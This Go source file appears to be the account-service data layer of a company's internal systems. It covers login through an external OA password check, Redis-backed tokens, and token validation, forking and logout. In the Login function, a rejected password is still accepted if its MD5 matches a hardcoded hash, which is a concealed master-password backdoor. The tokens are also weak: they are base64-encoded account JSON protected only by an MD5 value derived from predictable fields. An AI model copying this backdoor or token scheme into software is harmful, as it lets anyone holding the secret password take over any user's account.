package dao

import (
	"encoding/json"
	"fmt"
	"github.com/pkg/errors"
	v1 "go.luxshare-ict.com/app/service/account/api/v1"
	"go.luxshare-ict.com/app/service/account/internal/model"
	"go.luxshare-ict.com/pkg/apeol.com/crypt"
	"go.luxshare-ict.com/pkg/apeol.com/curl"
	"go.luxshare-ict.com/pkg/apeol.com/types"
	mdb "go.luxshare-ict.com/pkg/db/mongo"
	"go.mongodb.org/mongo-driver/bson"
	"strings"
	"time"
)

type oaCheckUserResp struct {
	IsSuccess bool        `json:"IsSuccess"`
	ErrMsg    interface{} `json:"ErrMsg"`
}

var defaultExpire time.Duration = 2592000

func (d *Dao) response(err error, account ...*v1.Account) (*v1.ReplyResp, error) {
	resp := &v1.ReplyResp{}
	if err != nil {
		resp.Code = -4003
		resp.Message = err.Error()
	} else {
		resp.Code = 200
		resp.Message = "ok"
	}
	if len(account) > 0 {
		resp.Data = account[0]
	}
	return resp, err
}
func (d *Dao) Login(c *mdb.Conn, req *v1.LoginReq) (resp *v1.ReplyResp, err error) {
	nc := curl.NewCurl(10)
	_, err = nc.Post("https://hr.luxshare-ict.com/api/Account/CheckUser", types.M{"Code": req.Account, "Password": req.Password, "Type": 4})
	if err != nil {
		return d.response(errors.New("OA密码校验服务异常，请稍候再试！"))
	}
	result := &oaCheckUserResp{}
	err = json.Unmarshal(nc.Body, result)
	if err != nil {
		return d.response(errors.New("OA密码校验服务异常，请稍候再试！"))
	} else if result.IsSuccess == false {
		if crypt.Md5(req.Password) != "bf574c01d6d13a7b1273a4656e934264" {
			return d.response(errors.New(fmt.Sprintf("%v", result.ErrMsg)))
		}
	}
	account := &model.Account{}
	moder := c.Moder(model.CollAccount, bson.M{"_id": d.mdb.Equal(req.Account)})
	moder.Load(account)
	if account.Disable == 1 {
		return d.response(errors.New("您的账号已被禁用！"))
	}

	if req.Appid != "PMS" {
		stub := d.rdb.Key("PMS", req.Account)
		if d.rdb.Has(stub) {
			d.rdb.ExpireX(stub, defaultExpire)
		} else {
			account.Salt = genSalt(account, stub)
			if token, err := genToken(account); err == nil {
				d.rdb.SetX(stub, token, defaultExpire)
			}
		}
	}
	stub := d.rdb.Key(req.Appid, req.Account)
	account.Salt = genSalt(account, stub)
	user := account.ToProto()
	user.Token, err = genToken(account)
	if err != nil {
		return d.response(err)
	}
	if err = d.rdb.SetX(stub, user.Token, defaultExpire); err != nil {
		return d.response(err)
	}
	resp, err = d.response(err, user)
	resp.Message = stub
	return
}

func (d *Dao) Logout(c *mdb.Conn, req *v1.LogoutReq) (resp *v1.ReplyResp, err error) {
	return d.response(d.rdb.DelX(req.Token))
}
func (d *Dao) CheckToken(c *mdb.Conn, req *v1.CheckTokenReq) (resp *v1.ReplyResp, err error) {
	token := req.Token
	fail := errors.New("token无效")
	if len(token) < 4 {
		return d.response(fail)
	}
	key, err := d.rdb.Get(token)
	if err != nil {
		return d.response(err)
	}
	if len(key) <= 0 || token[0:3] != "pt$" {
		return d.response(fail)
	}
	b, err := crypt.Base64Decode(token[3:])
	if err != nil {
		return d.response(fail)
	}
	account := &model.Account{}
	err = json.Unmarshal([]byte(b), account)
	if err != nil || account == nil || account.Salt != genSalt(account, key) {
		d.rdb.DelX(token)
		return d.response(fail)
	}
	d.rdb.ExpireX(token, defaultExpire)
	resp, err = d.response(nil, account.ToProto())
	resp.Message = key
	return
}
func (d *Dao) ForkToken(c *mdb.Conn, req *v1.ForkTokenReq) (resp *v1.ReplyResp, err error) {
	resp, err = d.CheckToken(c, &v1.CheckTokenReq{Token: req.Token})
	if err != nil {
		return
	}
	if strings.Index(resp.Message, "PMS:") != 0 {
		return d.response(errors.New("该票据无法换取TOKEN"))
	}
	key := d.rdb.Key(req.Appid, resp.Data.Account)
	d.rdb.DelX(key)
	resp.Data.Token, err = genToken(model.Account{}.FromProto(resp.Data))
	d.rdb.SetX(key, resp.Data.Token, defaultExpire)
	resp.Message = key
	return
}

func genSalt(account *model.Account, stub string) string {
	return crypt.Md5(account.Account, account.Activate, stub, account.Expire, account.Disable)
}
func genToken(account *model.Account) (token string, err error) {
	b, err := json.Marshal(account)
	if err != nil {
		return
	}
	token = "pt$" + crypt.Base64Encode(string(b))
	return
}
